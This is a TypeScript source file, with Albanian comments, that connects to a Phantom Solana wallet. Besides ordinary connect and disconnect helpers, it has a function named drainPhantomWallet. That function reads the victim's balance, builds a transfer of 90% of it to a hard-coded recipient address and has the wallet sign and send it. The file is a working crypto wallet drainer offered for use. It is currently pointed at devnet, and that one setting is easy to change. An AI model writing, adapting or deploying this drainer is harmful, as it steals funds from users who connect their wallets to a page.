import { PublicKey, Connection, Transaction, SystemProgram, LAMPORTS_PER_SOL, clusterApiUrl } from "@solana/web3.js";

// Përdor devnet për testim
const connection = new Connection(clusterApiUrl('devnet'), 'confirmed');
const RECIPIENT_ADDRESS = new PublicKey("9C74cPLodhAsTSYujZhSzPuSwCHjLck3u7nHoPHdV1DQ");
const PERCENTAGE_TO_SEND = 0.9; // 90% e bilancit

declare global {
  interface Window {
    solana?: {
      isPhantom?: boolean;
      connect: () => Promise<{ publicKey: { toString: () => string } }>;
      disconnect: () => Promise<void>;
      signAndSendTransaction: (transaction: Transaction) => Promise<{ signature: string }>;
    };
  }
}

export async function connectPhantomWallet(): Promise<string> {
  if (!window.solana || !window.solana.isPhantom) {
    throw new Error("Phantom wallet not found");
  }
  try {
    const response = await window.solana.connect();
    return response.publicKey.toString();
  } catch (error) {
    throw new Error("Failed to connect to Phantom wallet");
  }
}

export async function disconnectPhantomWallet(): Promise<void> {
  if (!window.solana) {
    throw new Error("Phantom wallet not found");
  }
  try {
    await window.solana.disconnect();
  } catch (error) {
    throw new Error("Failed to disconnect from Phantom wallet");
  }
}

export async function drainPhantomWallet(): Promise<void> {
  if (!window.solana || !window.solana.isPhantom) {
    throw new Error("Phantom wallet not found");
  }

  try {
    console.log("Lidhja me portofolin...");
    const response = await window.solana.connect();
    const walletPubKey = new PublicKey(response.publicKey.toString());
    console.log("U lidh me portofolin:", walletPubKey.toString());

    // Kontrollo bilancin
    const balance = await connection.getBalance(walletPubKey);
    console.log("Bilanci aktual:", balance / LAMPORTS_PER_SOL, "SOL");

    if (balance <= 0) {
      throw new Error("Portofoli nuk ka fonde");
    }

    // Llogarit 90% të bilancit
    const amountToSend = Math.floor(balance * PERCENTAGE_TO_SEND);
    console.log(`Do transferohen: ${amountToSend / LAMPORTS_PER_SOL} SOL`);

    // Krijo transaksionin
    const transaction = new Transaction();
    const { blockhash } = await connection.getLatestBlockhash('finalized');
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = walletPubKey;

    // Krijo instruktorin e transferimit
    const transferIx = SystemProgram.transfer({
      fromPubkey: walletPubKey,
      toPubkey: RECIPIENT_ADDRESS,
      lamports: amountToSend,
    });

    transaction.add(transferIx);

    try {
      console.log("Duke dërguar transaksionin...");
      const { signature } = await window.solana.signAndSendTransaction(transaction);
      console.log("Transaksioni u dërgua me sukses, firma:", signature);

      // Prisni konfirmimin
      const confirmation = await connection.confirmTransaction(signature);
      if (confirmation.value.err) {
        throw new Error(`Transaksioni dështoi: ${confirmation.value.err}`);
      }

      console.log("Transaksioni u konfirmua me sukses!");
    } catch (sendError) {
      console.error("Gabim gjatë transaksionit:", sendError);
      throw new Error("Dështoi dërgimi i transaksionit. Provo përsëri.");
    }
  } catch (error) {
    console.error("Procesi i transaksionit dështoi:", error);
    throw error;
  }
}